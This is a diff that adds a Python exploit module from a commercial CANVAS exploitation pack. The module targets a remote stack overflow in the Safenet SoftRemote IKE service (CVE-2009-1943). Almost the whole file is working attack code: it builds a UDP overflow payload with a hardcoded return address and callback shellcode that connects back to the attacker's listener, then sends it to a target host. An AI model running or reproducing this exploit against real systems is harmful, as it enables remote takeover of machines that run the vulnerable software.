@@ -1,0 +1,133 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+
+import sys
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+import struct
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from shellcode import shellcodeGenerator
+
+
+# GUI info
+NAME = "Safenet SoftRemote IKE Service Remote Stack Overflow Vulnerability"
+
+DESCRIPTION = "remote Stack Overflow Vulnerability in Safenet SoftRemote IKE Service"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Safenet"
+DOCUMENTATION["Repeatability"] = "Once"
+DOCUMENTATION["Date public"] = "2009.06.01"
+DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-09-024/"
+DOCUMENTATION["Versions Affected"] = "Safenet SoftRemote < 10.8.6"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2009-1943"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1943"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = "1.0"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "XP"]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0 : [ "Safenet SoftRemote (No NX)", 0x100138d2 ], # push esp, ret @ IreComn.dll      
+}
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.setInfo(DESCRIPTION)
+        self.name = NAME       
+        self.port = 62514
+        self.badstring = "\x00"   
+        self.version = 0        
+        
+        return
+
+
+    def neededListenerTypes(self):
+        from canvasengine import WIN32MOSDEF
+        return [WIN32MOSDEF]    
+
+
+    def createShellcode(self):
+        if self.callback:
+        	host = self.callback.ip
+        	port = self.callback.port       
+                         
+        return self.createSmallWin32Shellcode(host, port)
+
+
+    def run(self):
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))                       
+        
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        sploitstring = self.makesploit()
+                
+        try:            
+          s = self.getudpsock()
+          s.connect((self.host, self.port))
+          s.sendall(sploitstring)
+        except:            
+          self.log("Attack reported no open socket - service died?")
+          self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME, self.host, self.port))
+          return 0
+      
+        return 1
+        
+        
+    def makesploit(self):		    					
+    	os_name, push_ret = targets[self.version]
+    	ret = struct.pack('<L', push_ret)
+
+    	sploitstring = "\x00\x00\x00\x01" + "A" * 217 + ret + self.shellcode + "B" * (300 - len(self.shellcode))
+    	
+    	return sploitstring
+      
+        		
+    def displayVersions(self):
+    	i = 0
+    	print 'Available versions:'
+    	for listline in targets.values():
+    		print "\t%d: %s" % (i,listline[0])
+    		i += 1
+
+
+    def usage(self):
+    	print "Usage: %s -v version -t targethost -p port -l localip -d localport\n" % (sys.argv[0])
+    	self.displayVersions()
+    	sys.exit(0)
+
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
